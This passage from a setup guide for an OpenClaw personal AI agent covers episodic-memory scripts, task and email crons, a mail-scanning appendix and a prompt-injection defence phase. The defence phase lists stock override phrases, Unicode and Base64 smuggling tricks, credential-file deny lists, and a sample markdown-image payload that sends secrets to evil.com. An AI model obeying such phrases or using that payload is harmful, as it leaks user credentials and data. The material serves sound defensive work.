# Smart episode recall: QMD vector search + decay weighting
# Usage: smart-recall.sh "query" [top_n]

set -euo pipefail

QUERY="${1:?Usage: smart-recall.sh \"query\" [top_n]}"
TOP_N="${2:-5}"
EPISODE_DIR="${OPENCLAW_WORKSPACE:-$(pwd)}/memory/episodes"

# Step 1: Use QMD for initial candidate retrieval (vector similarity)
CANDIDATES=$(qmd vsearch "$QUERY" -n 20 -c memory/episodes 2>/dev/null || echo "")

if [ -z "$CANDIDATES" ]; then
  # Fallback to keyword-based recall
  python3 tools/episodes/recall.py "$QUERY" --top "$TOP_N" --episode-dir "$EPISODE_DIR"
  exit 0
fi

# Step 2: Re-rank with decay weighting
python3 tools/episodes/recall.py "$QUERY" --top "$TOP_N" --episode-dir "$EPISODE_DIR"
```

For the agent, add this to the AGENTS.md semantic recall step:

```markdown
7. **Semantic recall**: If the user's first message has a clear topic:
   a. `qmd vsearch "TOPIC" -n 3 -c memory` (existing — facts & daily notes)
   b. `python3 tools/episodes/recall.py "TOPIC" --top 3` (NEW — episodic memory)
```

### 12.4 Automated Consolidation

Episodic memory grows. Without maintenance, it fills with duplicates, stale entries, and near-identical lessons. Consolidation keeps it sharp.

#### Duplicate Detection

Create `tools/episodes/consolidate.py`:

```python
#!/usr/bin/env python3
"""
Episode Consolidation — Detect duplicates, merge related episodes, archive stale ones.
Usage: python3 tools/episodes/consolidate.py [--dry-run] [--archive-days 180]
"""

import json, glob, os, shutil, argparse
from datetime import datetime, timezone
from pathlib import Path
from collections import defaultdict

def load_all(episode_dir):
    episodes = []
    for f in sorted(glob.glob(str(Path(episode_dir) / "*.json"))):
        try:
            with open(f) as fh:
                ep = json.load(fh)
                ep['_path'] = f
                episodes.append(ep)
        except (json.JSONDecodeError, KeyError):
            continue
    return episodes

def jaccard_similarity(a, b):
    """Word-level Jaccard similarity between two strings."""
    set_a = set(a.lower().split())
    set_b = set(b.lower().split())
    if not set_a or not set_b:
        return 0.0
    return len(set_a & set_b) / len(set_a | set_b)

def find_duplicates(episodes, threshold=0.6):
    """Find episode pairs with high lesson + context similarity."""
    dupes = []
    for i, a in enumerate(episodes):
        for b in episodes[i+1:]:
            lesson_sim = jaccard_similarity(a['lesson'], b['lesson'])
            context_sim = jaccard_similarity(a['context'], b['context'])
            combined = (lesson_sim * 0.6) + (context_sim * 0.4)
            if combined >= threshold:
                dupes.append((a, b, combined))
    return dupes

def find_stale(episodes, archive_days=180):
    """Find episodes older than archive_days with low importance."""
    now = datetime.now(timezone.utc)
    stale = []
    for ep in episodes:
        try:
            dt = datetime.fromisoformat(ep['timestamp'])
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            age = (now - dt).days
            if age > archive_days and ep.get('importance', 5) < 6:
                stale.append((ep, age))
        except (ValueError, KeyError):
            continue
    return stale

def merge_episodes(keeper, duplicate):
    """Merge duplicate into keeper, preserving unique info."""
    # Keep higher importance
    keeper['importance'] = max(keeper.get('importance', 5), duplicate.get('importance', 5))
    # Append unique tags
    existing_tags = set(keeper.get('tags', []))
    for tag in duplicate.get('tags', []):
        if tag not in existing_tags:
            keeper.setdefault('tags', []).append(tag)
    # If duplicate has a different lesson angle, append it
    if jaccard_similarity(keeper['lesson'], duplicate['lesson']) < 0.8:
        keeper['lesson'] += f" (Also: {duplicate['lesson']})"
    return keeper

def consolidate(episode_dir, archive_days=180, dry_run=False):
    episodes = load_all(episode_dir)
    archive_dir = Path(episode_dir) / 'archive'
    
    if not dry_run:
        archive_dir.mkdir(exist_ok=True)
    
    actions = []

    # 1. Find and merge duplicates
    dupes = find_duplicates(episodes)
    for a, b, sim in dupes:
        actions.append(f"MERGE: '{a['title']}' + '{b['title']}' (similarity: {sim:.2f})")
        if not dry_run:
            merged = merge_episodes(a, b)
            with open(a['_path'], 'w') as f:
                json.dump({k: v for k, v in merged.items() if k != '_path'}, f, indent=2)
            shutil.move(b['_path'], str(archive_dir / Path(b['_path']).name))

    # 2. Archive stale low-importance episodes
    stale = find_stale(episodes, archive_days)
    for ep, age in stale:
        if ep['_path'] in [b['_path'] for _, b, _ in dupes]:  # Already handled
            continue
        actions.append(f"ARCHIVE: '{ep['title']}' (age: {age}d, importance: {ep['importance']})")
        if not dry_run:
            shutil.move(ep['_path'], str(archive_dir / Path(ep['_path']).name))

    return actions

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Consolidate episodes')
    parser.add_argument('--episode-dir', default='memory/episodes')
    parser.add_argument('--archive-days', type=int, default=180)
    parser.add_argument('--dry-run', action='store_true')
    args = parser.parse_args()

    actions = consolidate(args.episode_dir, args.archive_days, args.dry_run)
    
    if not actions:
        print("No consolidation needed.")
    else:
        prefix = "[DRY RUN] " if args.dry_run else ""
        for action in actions:
            print(f"{prefix}{action}")
        print(f"\n{prefix}Total actions: {len(actions)}")
```

#### Merge Strategy

When two episodes have >60% combined similarity (lesson x 0.6 + context x 0.4):

1. **Keep the higher-importance episode** as the base
2. **Merge unique tags** from the duplicate
3. **Append distinct lesson angles** — if the duplicate teaches something slightly different, add it with "(Also: ...)"
4. **Move the duplicate to `memory/episodes/archive/`** — not deleted, just filed away

#### Stale Episode Policy

Episodes older than 180 days with importance < 6 get archived automatically. The reasoning:

- **High-importance episodes (6+) persist forever** — production lessons, architectural decisions, rare bugs
- **Low-importance old episodes decay naturally** — routine fixes, temporary workarounds, context that's no longer relevant
- **Archived episodes aren't deleted** — they're moved to `memory/episodes/archive/` and excluded from active recall, but still searchable if you need them

### 12.5 Integration with Existing Systems

Wire episodic memory into the systems you already have running from Phases 1-11.

#### AGENTS.md Updates

Add to your boot sequence (after the existing step 7):

```markdown
8. **Episodic recall**: If the task resembles past work, run:
   `python3 tools/episodes/recall.py "TASK_DESCRIPTION" --top 3`
   Apply relevant lessons before starting.

### Episodic Memory

After completing significant tasks (importance >= 5):
- Write episode to `memory/episodes/ep-YYYY-MM-DD-short-desc.json`
- Score importance honestly: Novelty(0-2) + Impact(0-3) + Reusability(0-2) + Difficulty(0-2) + Surprise(0-1)
- Include specific, actionable lessons — not platitudes
```

#### Heartbeat Integration

Add to `HEARTBEAT.md`:

```markdown
### Episodic Memory Maintenance (weekly)
- [ ] Run consolidation: `python3 tools/episodes/consolidate.py --dry-run`
- [ ] Review flagged merges/archives, then run without --dry-run
- [ ] Re-index: `bash tools/episodes/index-episodes.sh`
- [ ] Check episode count — target 30-60 active episodes
```

Track the check in `memory/heartbeat-state.json`:

```json
{
  "lastChecks": {
    "email": 1703275200,
    "calendar": 1703260800,
    "weather": null,
    "episodeConsolidation": null
  }
}
```

#### Cron Jobs

Set up automated maintenance using OpenClaw's cron system:

```bash
# Weekly consolidation check (Sundays at 3 AM)
openclaw cron add \
  --schedule "0 3 * * 0" \
  --task "Run episode consolidation: cd $OPENCLAW_WORKSPACE && python3 tools/episodes/consolidate.py && bash tools/episodes/index-episodes.sh" \
  --channel telegram

# Daily episode index rebuild (2 AM)
openclaw cron add \
  --schedule "0 2 * * *" \
  --task "Rebuild episode index: cd $OPENCLAW_WORKSPACE && bash tools/episodes/index-episodes.sh" \
  --channel telegram
```

#### Integration with Phase 5 (Hourly Summarizer)

Your hourly summarizer already scans recent activity. Add episode extraction to it:

```markdown
# Add to your hourly summarizer prompt:

After generating the hourly summary, check if any tasks in this hour
qualify for episodic memory (importance >= 5). If so, generate the
episode JSON and write it to memory/episodes/.
```

This creates a natural pipeline: work happens → hourly summarizer captures it → significant tasks get promoted to episodic memory → consolidation keeps the store clean.

#### Integration with Retros

Retros are a natural source of high-importance episodes. After running a retro:

```markdown
# Add to your retro skill:

After completing the retro, extract 1-3 top lessons and log them as
episodes with importance >= 7. Retro-sourced episodes should have
task_type: "decision" and tag: "retro".
```

### 12.6 Benefits Analysis

Concrete improvements from implementing agentic memory:

| Dimension | Before (Phases 1-11) | After (Phase 12) | Improvement |
|-----------|---------------------|-------------------|-------------|
| **Lesson retention** | Lessons in daily notes, rarely re-read | Structured episodes with active recall | Agent recalls *how* it solved similar problems |
| **Context window efficiency** | All memory loaded equally | Importance + decay filtering | 40-60% reduction in irrelevant context |
| **Repeated mistakes** | Same debugging steps re-discovered | Episode recall surfaces past approaches | Near-zero repeat debugging for logged issues |
| **Memory maintenance** | Manual MEMORY.md curation | Automated consolidation + archival | Self-maintaining with weekly cron |
| **Decision quality** | Decisions based on current context only | Past outcomes inform new decisions | Compound learning across sessions |
| **Noise ratio** | Every task noted equally in daily files | Write gate filters low-importance events | Episode store stays lean (30-60 active vs 300+ daily entries) |

**The key shift:** Phases 1-11 gave your agent *storage*. Phase 12 gives it *judgment* about what to store, *intelligence* about what to recall, and *discipline* about what to forget.

A well-tuned episodic memory system means your agent gets meaningfully better at its job over time — not just because the model improves, but because *your specific agent* accumulates experience that persists across sessions, models, and even platform upgrades.

---

# Tier 5: Hardening & Integration

---

## Phase 13: Canonical Tasks, Daily Prep & Email Sweep

Inspired by Ryan Carson's clawchief system (4,800+ bookmarks) — the insight that transformed his OpenClaw from a reactive chatbot into a chief of staff: *"I didn't get the world's best assistant by asking better questions. I got it by giving it a better operating system."*

This phase adds three things: a single source of truth for tasks, a cron that preps your day before you wake up, and an email triage system.

### 13.1 Canonical Task List (`tasks/current.md`)

Stop scattering tasks across daily logs, Obsidian, chat history, and your head. One file. Four sections.

```markdown
# Tasks — Single Source of Truth

## Today
- [ ] Review Exchange Building lease renewal
- [ ] Test AIO calendar sync with Google Calendar
- [ ] Reply to Murray Wells re: contractor walkthrough

## This Week
- [ ] VerdictAI: Define product scope with Arslan
- [ ] Set up GOG for Gmail integration
- [ ] Wire real Obsidian data into AIO production

## Backlog
- [ ] AIO: Pi camera mail automation
- [ ] Building OS: Deploy and pilot with Exchange STR units
- [ ] Marina: Slip pricing model

## Done (Recent)
- [x] AIO Dashboard — full build + deploy
- [x] Memory architecture upgrade (Phases 10-12)
- [x] Calendar sync (iCal, Google, file upload)
```

**Rules:**
- Agent reads this file **every session** (add to AGENTS.md boot sequence)
- Agent updates it as tasks complete, get added, or change priority
- Items move: Backlog → This Week → Today → Done
- When emails, messages, or meetings create action items → add to the appropriate section
- Completed items (`[x]`) get archived weekly

Add to your AGENTS.md:
```markdown
### Task Management — One Source of Truth
`tasks/current.md` is THE task list. Read it at session start.
Update it when tasks complete or new ones appear.
Daily prep cron runs at 6am to promote due items and deduplicate.
```

### 13.2 Daily Task Prep Cron

A script that runs before you wake up, so your day is ready when you check in.

**`tools/daily-task-prep.sh`:**

What it does:
1. **Backs up** the task file daily to `tasks/archive/`
2. **Scans Backlog** for items with dates that have arrived → promotes to Today
3. **Deduplicates** repeated tasks across all sections
4. **Archives** completed items weekly (Mondays) to `tasks/archive/done-week-of-YYYY-MM-DD.md`
5. **Reports** summary: counts per section, promotions made, duplicates found

```bash
#!/usr/bin/env bash
# daily-task-prep.sh — Run at 6am via cron
set -euo pipefail
WORKSPACE="${WORKSPACE:-$(pwd)}"
TASK_FILE="$WORKSPACE/tasks/current.md"

# Backup
cp "$TASK_FILE" "$WORKSPACE/tasks/archive/current-$(date +%Y-%m-%d).md"

# Promote due items (items in Backlog with dates <= today)
# Deduplicate (find identical task text across sections)
# Archive done items on Mondays
# Report summary
```

Register the cron:
```bash
openclaw cron add \
  --name "daily-task-prep" \
  --cron "0 6 * * *" \
  --tz "America/Chicago" \
  --message "Run daily task prep: bash tools/daily-task-prep.sh. Read tasks/current.md. Promote due items to Today. Deduplicate. Notify via Telegram only if there are changes." \
  --model "sonnet" \
  --session "isolated" \
  --light-context \
  --timeout-seconds 60
```

Why Sonnet: this is mechanical work, doesn't need Opus. Saves ~80% on this cron.

### 13.3 Email Sweep Skill

The most requested "chief of staff" feature: proactive inbox triage.

**Prerequisites:** GOG (Google OAuth Gateway) for Gmail access. Without GOG, this skill is dormant.

**Create `skills/email-sweep/SKILL.md`:**

The sweep runs every 15 minutes and does:

1. **Search** for unread emails since last sweep
2. **Score** each email by priority:
   - **Urgent** — Known contacts, "urgent"/"asap", financial/legal, calendar invites → Telegram notification immediately
   - **Important** — Known contacts, project-related, replies to active threads → included in sweep summary
   - **Low** — Newsletters, marketing, automated notifications → skip
   - **Ignore** — Spam, promotions, receipts → skip entirely
3. **Detect follow-ups needed** — outbound emails >24h with no reply
4. **Add action items** to `tasks/current.md` when emails require a response
5. **Respect quiet hours** — 11pm-7am: urgent only. Weekends: 2 sweeps/day.

**Contact priority list** (`tools/email-sweep/contacts.json`):
```json
{
  "vip": ["important@person.com", "@familydomain.com"],
  "projects": ["@exchange-building.com"],
  "business": ["@company.com"]
}
```

**Output format:**
```
Email Sweep — 3:15 PM

URGENT (1):
- From: Murray Wells — "Lease renewal deadline Friday"
  → Action: Review and sign

IMPORTANT (2):
- From: Arslan — "VerdictAI product scope"
- From: GitHub — PR review on sardoru/aio

FOLLOW-UPS (1):
- No reply from Contractor re: "Walkthrough scheduling" (2 days)

Skipped: 12 newsletters, 3 promos
```

**Cron setup (activate after GOG):**
```bash
openclaw cron add \
  --name "email-sweep" \
  --every "15m" \
  --tz "America/Chicago" \
  --message "Run email sweep. Check Gmail for unread. Triage by priority. Notify only for urgent items or first sweep of the day." \
  --model "sonnet" \
  --session "isolated" \
  --light-context \
  --timeout-seconds 45
```

**State tracking** (`memory/email-sweep-state.json`):
```json
{
  "lastSweep": "2026-04-03T19:45:00Z",
  "urgentCount": 1,
  "importantCount": 3,
  "followUpsFound": 1
}
```

### 13.4 Integration

All three systems feed into each other:

```
Email Sweep (every 15m)
  │
  ├─ Urgent emails → Telegram notification
  ├─ Action items → tasks/current.md ## Today
  └─ Follow-ups → tasks/current.md ## Today

Daily Task Prep (6am)
  │
  ├─ Promote due items → ## Today
  ├─ Deduplicate across sections
  ├─ Archive completed items (Mondays)
  └─ Summary → Telegram (if changes)

Agent Session (on demand)
  │
  ├─ Reads tasks/current.md at boot
  ├─ Updates tasks as work is done
  └─ Adds new tasks from conversations
```

### 13.5 Benefits Analysis

| Before | After | Impact |
|--------|-------|--------|
| Tasks scattered across daily logs, Obsidian, chat | One canonical `tasks/current.md` | Never lose a task, always know what's on Today |
| Morning starts with "what was I doing?" | Day is prepped at 6am with promoted items | Hit the ground running every morning |
| Email checked manually, things fall through | 15-min sweep surfaces only what matters | Important emails never missed, junk never shown |
| Follow-ups forgotten | Agent tracks unanswered outbound >24h | Relationships maintained, nothing drops |
| Passive agent waits for instructions | Proactive agent manages your operational reality | Agent shifts from tool to chief of staff |

**The key shift:** Phases 1-12 made your agent intelligent and self-improving. Phase 13 makes it *operationally proactive* — it doesn't wait for you to ask, it manages your day.

---

## Phase 14: Security Hardening

Inspired by Matthew Berman's "Teaching OpenClaw to not get Hacked" (1,542 bookmarks). Your agent processes untrusted input from X articles, web pages, email, and chat — every one of those is a prompt injection surface. This phase adds a layered defense system plus a consent registry for sensitive operations.

**The core principle:** No single check catches everything. Layers run cheapest first — most attacks die at Layer 1 (free, instant regex) and never reach Layer 2 (an LLM call).

### 14.1 Architecture Overview

```
Untrusted input
  → Layer 1: Text sanitization (pattern matching, Unicode cleanup)
  → Layer 2: Frontier scanner (LLM-based risk scoring)
  → Layer 3: Outbound content gate (catches leaks going out)
  → Layer 4: Redaction pipeline (PII, secrets, paths)
  → Layer 5: Runtime governance (spend caps, volume limits, loop detection)
  → Layer 6: Access control (file paths, URL safety)
```

All tools live in `tools/security/` with a single config file and a master gate that chains Layers 1+2.

### 14.2 Layer 1: Deterministic Text Sanitizer

The workhorse. Runs on every piece of untrusted text before any LLM sees it. Instant, no API calls.

**Create `tools/security/sanitize.sh`:**

What it strips/detects:
- **Invisible Unicode** — Zero-width spaces, joiners, RTL/LTR marks, soft hyphens, BOMs. Invisible to humans, readable by LLMs. An email that looks normal could contain full override instructions between every character.
- **HTML entities** — `&#115;ystem` decodes to `system`. Bypasses pattern matching.
- **Cyrillic lookalikes** — normalized to Latin equivalents. Your regex for "system" won't catch "ѕyѕtem".
- **Role markers** — "ignore previous instructions", "you are now", "system:", "reveal your prompt", "admin mode", "debug mode", jailbreak patterns, special tokens ([INST], <|system|>)
- **Base64 blocks** — Encoded hidden instructions
- **Excessive combining marks** — Garbled text attacks

```bash
# Usage: echo "untrusted text" | bash tools/security/sanitize.sh
# Exit 0 = clean, Exit 1 = blocked
# Stats to stderr as JSON: {"role_markers": 5, "total_score": 10, "blocked": true}
```

Scoring: each detection type adds points. Threshold (default 3) triggers block. Configurable in `config.json`.

### 14.3 Layer 2: Frontier Scanner

Pattern matching catches known attacks. But prompt injection is a semantic problem — attackers phrase intent a thousand ways. The frontier scanner uses a dedicated LLM (not your agent's model) for classification.

```bash
# Usage: echo "text" | bash tools/security/frontier-scan.sh --source web
# Returns: {"verdict": "allow|review|block", "score": 0-100, "categories": [...]}
```

Key design decisions:
- **Use the strongest model available** for scanning (or gpt-4o-mini for cost). A weak model scanning for injections might fall for the very attack it's detecting.
- **Override the model's verdict** if score contradicts it (says "allow" but scores 75 → force block)
- **Fail behavior per source:** email/webhook = fail closed (block on error). Chat/web = fail open (allow on error). Configurable.

### 14.4 Layer 3: Outbound Content Gate

Protects against malicious *output* — things the LLM might produce that shouldn't leave the system.

```bash
# Usage: echo "outbound message" | bash tools/security/outbound-gate.sh
# Exit 0 = clean, Exit 1 = blocked
```

Catches:
- **API keys** — OpenAI (sk-...), Anthropic (sk-ant-...), GitHub (ghp_/gho_), Telegram bot tokens, AWS keys
- **Internal file paths** — /Users/you/, ~/.openclaw/, ~/.config/, ~/.ssh/
- **Private IPs** — localhost, 192.168.x, 10.x, 172.16-31.x
- **Prompt injection artifacts** — Role markers that survived into output
- **Data exfiltration** — `![img](https://evil.com/steal?data=SECRET)` — markdown image tags that phone home

### 14.5 Layer 4: Redaction Pipeline

Strips sensitive data from any outbound text:

```bash
# Usage: echo "text with secrets" | bash tools/security/redact.sh
# Output: text with [REDACTED_PHONE] and [REDACTED_EMAIL]
```

| Pattern | Replacement |
|---------|------------|
| API keys (sk-*, ghp_*, etc.) | `[REDACTED_API_KEY]` |
| Personal emails (gmail, yahoo, etc.) | `[REDACTED_EMAIL]` |
| Phone numbers (US + E.164) | `[REDACTED_PHONE]` |
| SSN patterns | `[REDACTED_SSN]` |
| Credit card patterns | `[REDACTED_CC]` |
| Sensitive file paths | `[REDACTED_PATH]` |

Work email domains pass through. Only personal email providers get redacted.

### 14.6 Layer 5: Runtime Governance

**"Bugs burn more money than attacks."** — Berman's key insight. Cron overlaps, retry storms, and cursor bugs cost more than malicious attacks.

```bash
# Check if a call is allowed:
bash tools/security/governance.sh check

# Log a call:
bash tools/security/governance.sh log --cost 0.05 --caller "email-sweep"

# View status:
bash tools/security/governance.sh status
```

Four mechanisms:
- **Spend limit** — Warn at $5/5min, hard cap at $15/5min
- **Volume limit** — 200 calls/10min global, per-caller limits (email-sweep: 40, frontier-scan: 50)
- **Lifetime counter** — 500 calls per process. Catches infinite loops no matter how they happen.
- **Duplicate detection** — Hash recent prompts, return cached if seen in last 5 minutes

### 14.7 Layer 6: Access Control

```bash
# Check file access:
bash tools/security/access-control.sh check-path "/Users/you/.ssh/id_rsa"
# {"allowed": false, "reason": "Matches deny filename: .ssh"}

# Check URL access:
bash tools/security/access-control.sh check-url "http://192.168.1.1/admin"
# {"allowed": false, "reason": "Private IP (192.168.x)"}
```

Path guards:
- Deny list: `.env`, `.ssh`, `credentials`, `tokens`, `id_rsa`, `.gnupg`, `keychain`, `secret`, `.netrc`
- Deny extensions: `.pem`, `.key`, `.p12`, `.pfx`, `.jks`
- Allowed directories whitelist (only your workspace + projects + tmp)

URL safety:
- Only http/https allowed
- Block private/reserved IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, ::1)
- Block DNS rebinding services

### 14.8 Master Gate

Chains Layer 1 + Layer 2 behind a single entry point:

```bash
# Full gate (sanitize + scan):
echo "untrusted text" | bash tools/security/gate.sh --source web

# Sanitize only (skip LLM scanner):
echo "untrusted text" | bash tools/security/gate.sh --sanitize-only

# For email (fail-closed on scanner error):
echo "email body" | bash tools/security/gate.sh --source email
```

### 14.9 Configuration

All thresholds in one file (`tools/security/config.json`):

```json
{
  "sanitizer": { "max_chars": 50000, "block_threshold": 3 },
  "scanner": {
    "model": "gpt-4o-mini",
    "review_threshold": 35,
    "block_threshold": 70,
    "fail_closed_sources": ["email", "webhook"],
    "fail_open_sources": ["chat", "web"]
  },
  "governance": {
    "spend_warn_5min": 5.0,
    "spend_cap_5min": 15.0,
    "volume_cap_10min": 200,
    "lifetime_cap": 500
  },
  "access": {
    "allowed_dirs": ["/Users/you/workspace/", "/tmp/"],
    "deny_filenames": [".env", ".ssh", "credentials", "tokens", "id_rsa"]
  }
}
```

### 14.10 Consent Registry

For sensitive operations that require explicit user approval before proceeding. The consent registry tracks which actions have been pre-approved and which require real-time confirmation.

```markdown
# consent-registry.md

## Pre-Approved Actions
- File operations within workspace directory
- Read-only web searches
- Telegram notifications

## Requires Consent
- Sending emails on behalf of user
- Modifying files outside workspace
- Making purchases or financial transactions
- Sharing personal data with external services
- Deploying to production environments

## Consent Log
| Timestamp | Action | Approved | Expiry |
|-----------|--------|----------|--------|
```

Wire into AGENTS.md:
```markdown
### Consent
Before performing any action in the "Requires Consent" list, ask the user explicitly.
Log all consent decisions to consent-registry.md.
Pre-approved actions can proceed without asking.
```

### 14.11 Benefits Analysis

| Before | After | Impact |
|--------|-------|--------|
| Untrusted X articles go straight to context | Sanitized first, role markers stripped | Invisible Unicode and injection patterns caught before LLM sees them |
| Outbound messages could leak credentials | Gate checks every message before send | API keys, file paths, PII auto-blocked |
| No spend protection | $15/5min hard cap + volume + lifetime limits | Runaway crons and retry storms can't drain your API budget |
| Agent can read any file | Path deny list blocks .env, .ssh, credentials | Successful injection can't escalate to credential theft |
| Agent can hit any URL | Private IPs blocked, only http/https | No SSRF attacks to internal services |
| One failure = full compromise | 6 independent layers | Each layer works alone; no single point of failure |
| Sensitive actions happen without asking | Consent registry gates risky operations | User maintains control over consequential actions |

**The key insight from Berman:** *"Each layer has to be independent. The sanitizer catches known patterns. The scanner catches semantic attacks. The governor caps the damage if both fail. No single layer is enough, and if any layer depends on another working correctly, the whole system is fragile. Independence is the point."*

---

# Appendices

---

## Appendix A: Physical Mail Intake Pipeline *(Optional)*

> **This appendix is optional.** It adds a physical-to-digital mail scanning and categorization system. If you don't need physical mail management, skip to Appendix B.

Most productivity systems stop at the digital boundary. But physical mail — bills, legal notices, insurance, tax documents — still arrives in paper form and creates its own backlog. This appendix bridges the gap: a camera-based scanning system that ingests physical mail into your agent's workflow with automatic OCR categorization.

### What It Does

1. **Snap a photo** of any piece of mail (phone camera, webcam, or automated Pi camera)
2. **OpenAI Vision (gpt-4o)** extracts: sender, description, category, dollar amount, due date, priority
3. **Review & confirm** the extracted data in a UI modal before it's filed
4. **Auto-categorizes** into shelves: Bills/Finance, Bills/Health, Bills/House, Records to File, Personal/Family, To-Do, Marketing, Spam
5. **Archives** scan images and logs entries to an Obsidian-compatible markdown file
6. **Tracks** unpaid amounts, due dates, and action-needed status across all mail

### A.1 Mail Intake Store

Add these types to your app's state management (example uses Zustand):

```typescript
export type MailCategory =
  | 'bills-finance'
  | 'bills-health'
  | 'bills-house'
  | 'records-to-file'
  | 'personal-family'
  | 'todo-non-bills'
  | 'marketing'
  | 'spam'
  | 'unsorted';

export type MailStatus = 'new' | 'opened' | 'action-needed' | 'processed' | 'filed' | 'trashed';

export interface MailItem {
  id: string;
  sender: string;
  description: string;
  category: MailCategory;
  status: MailStatus;
  priority: 'high' | 'medium' | 'low';
  receivedDate: string;
  dueDate?: string;
  amount?: number;
  notes?: string;
  createdAt: string;
}
```

Persist `mailItems` to local storage so the shelf state survives refreshes.

### A.2 OCR Module

Create a server-side module that calls OpenAI Vision to extract structured data from mail photos:

```typescript
// server/mail-ocr.ts
const SYSTEM_PROMPT = `You are a mail scanning assistant. Analyze this photo of physical mail
and extract structured data. Return ONLY valid JSON with these fields:

{
  "sender": "Company or person name",
  "description": "Brief description of the mail content",
  "category": "One of: bills-finance, bills-health, bills-house, records-to-file, personal-family, todo-non-bills, marketing, spam, unsorted",
  "priority": "high (bills with due dates, legal), medium (personal, records), low (marketing, spam)",
  "amount": null or dollar amount as number,
  "dueDate": null or "YYYY-MM-DD",
  "notes": "Brief summary of key content",
  "confidence": 0.0 to 1.0,
  "rawText": "Full text visible in the image"
}`;

export async function analyzeMailImage(
  imageBase64: string,
  hintCategory?: string
): Promise<MailOCRResult> {
  const response = await fetch('https://api.openai.com/v1/chat/completions', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${process.env.OPENAI_API_KEY}`,
    },
    body: JSON.stringify({
      model: 'gpt-4o',
      messages: [
        { role: 'system', content: SYSTEM_PROMPT },
        {
          role: 'user',
          content: [
            { type: 'text', text: hintCategory
              ? `Category hint: ${hintCategory}. Analyze this mail:`
              : 'Analyze this mail:' },
            { type: 'image_url', image_url: {
              url: `data:image/jpeg;base64,${imageBase64}`,
              detail: 'high'
            }}
          ]
        }
      ],
      max_tokens: 1000,
    }),
  });

  const data = await response.json();
  const content = data.choices[0].message.content;
  return JSON.parse(content); // Validate and coerce fields in production
}
```

### A.3 Ingestion API Endpoint

Add a POST endpoint to your server:

```
POST /api/mail/ingest
Body: { "image": "base64-encoded-jpeg", "category": "bills-finance" (optional) }

Response: {
  "success": true,
  "result": { sender, description, category, priority, amount, dueDate, notes, confidence, rawText },
  "scanPath": "mail-scans/2026-04-03-00-15-30.jpg"
}
```

The endpoint should:
- Save the scan image to `public/mail-scans/` with a timestamp filename
- Run OCR via the module above
- Append to an Obsidian-compatible markdown log (`mail-log.md`)
- Return the structured result for client-side review

### A.4 Camera Upload UI

Build a scan button that opens the phone's rear camera:

```html
<input type="file" accept="image/*" capture="environment" />
```

The flow:
1. User taps "Scan Mail" → phone camera opens
2. Photo captured → resized client-side to max 1024px (saves API tokens)
3. Base64 uploaded to `/api/mail/ingest`
4. OCR results shown in a **review modal** — user can adjust any field
5. On confirm → item added to mail shelf store

### A.5 Category Shelves UI

Build a visual shelf organizer with drag-and-drop between categories:

- Each category is a column/shelf with its own color and icon
- Drag mail items between shelves to re-categorize
- Stats bar shows: total items, new count, action-needed count, unpaid $ total, % processed
- Filter by category and status
- Responsive: phone gets single-column stacked shelves, desktop gets 3-4 column grid

### A.6 Hardware Automation (Future)

Once the software pipeline works with manual phone photos, you can automate with:

- **Raspberry Pi Zero 2W + Camera Module 3** (~$45) mounted over your mail sorting area
- QR code labels on each tray slot → camera detects which category
- Motion detection triggers auto-capture when mail is placed
- Runs the same `/api/mail/ingest` endpoint
- Agent sends Telegram notification: "New mail from AT&T — $142.50 bill due Apr 15"

### A.7 Integration with OpenClaw

Wire mail events into your agent's awareness:

- **Heartbeat check**: scan `mailItems` for overdue bills (status = action-needed, dueDate < today)
- **Daily summary**: include mail stats (new items, unpaid total)
- **Episodic memory**: log mail processing sessions as episodes
- **Obsidian vault**: `mail-log.md` is automatically searchable via QMD

### Benefits

| Without | With |
|---------|------|
| Paper mail piles up unsorted | Every piece scanned and categorized on arrival |
| Bills get missed/late | Due dates tracked, overdue alerts via agent |
| No record of what arrived | Searchable archive with images + OCR text |
| Manual data entry for each bill | Vision AI extracts sender, amount, due date automatically |
| Physical-only filing | Digital + physical — find anything by searching |

---

## Appendix B: Intent Router, Campaigns & Cost Tracking

This appendix covers efficiency optimizations: a 4-tier intent router that handles 60-70% of requests at zero token cost, campaign persistence for multi-step workflows, and per-project cost tracking.

### B.1 Intent Router — 4-Tier Classification

Not every message needs a frontier model. The router classifies intent before spending tokens:

| Tier | Handler | Cost | Examples |
|------|---------|------|---------|
| 1 | Regex/keyword match | Free | "what time is it", "set a reminder", status checks |
| 2 | Embedding classifier | ~$0.0001 | Topic routing, FAQ matching, simple Q&A |
| 3 | Small model (Haiku-class) | ~$0.001 | Summarization, formatting, simple analysis |
| 4 | Frontier model (Opus/Sonnet) | Full cost | Complex reasoning, code generation, multi-step tasks |

**Target:** 60-70% of routine messages handled at Tier 1-2 (near-zero cost).

### B.2 Campaign Persistence

Long-running workflows (multi-day research, iterative builds, ongoing negotiations) need state that survives across sessions:

```markdown
# campaigns/[campaign-id].md

## Campaign: [Name]
- **Created:** [date]
- **Status:** active | paused | complete
- **Goal:** [what success looks like]

## Progress Log
- [date] — [what happened]
- [date] — [what happened]

## Next Steps
- [ ] [next action]

## Context Files
- [links to relevant files]
```

### B.3 Per-Project Cost Tracking

Track LLM spend by project to understand where your budget goes:

```json
{
  "projects": {
    "exchange-pms": { "total": 45.20, "this_week": 12.30 },
    "verdictai": { "total": 18.50, "this_week": 5.10 },
    "background-crons": { "total": 22.00, "this_week": 4.50 }
  },
  "daily_budget": 25.00,
  "weekly_budget": 150.00
}
```

Wire into the governance layer (Phase 14) for per-project spend caps.

---

## Reference Appendix

### Build Harness Skill Files

| Skill | Path | Purpose |
|-------|------|---------|
| evaluator | `skills/evaluator/SKILL.md` | Skeptical critic with 4 criteria, browser testing, anti-leniency |
| build-harness | `skills/build-harness/SKILL.md` | 3-agent orchestration: planner → generator → evaluator |
| jonyive | `skills/jonyive/SKILL.md` | Design principles mapped to evaluator criteria |

### Full Cron Schedule

| Job | Schedule | Model | Purpose |
|-----|----------|-------|---------|
| hourly-memory-summarizer | :55 every hour | Sonnet | Keep context fresh |
| vector-memory-reindex | Every 4h | Sonnet | Rebuild semantic search |
| morning-brief | 7 AM daily | Sonnet | Daily briefing |
| forge-daily-review | 6:30 AM daily | Sonnet | Ops audit |
| daily-roundtable | 9 PM daily | Sonnet | Cross-agent synthesis |
| forge-weekly-synthesis | Sunday 9 PM | Sonnet | Weekly rollup |
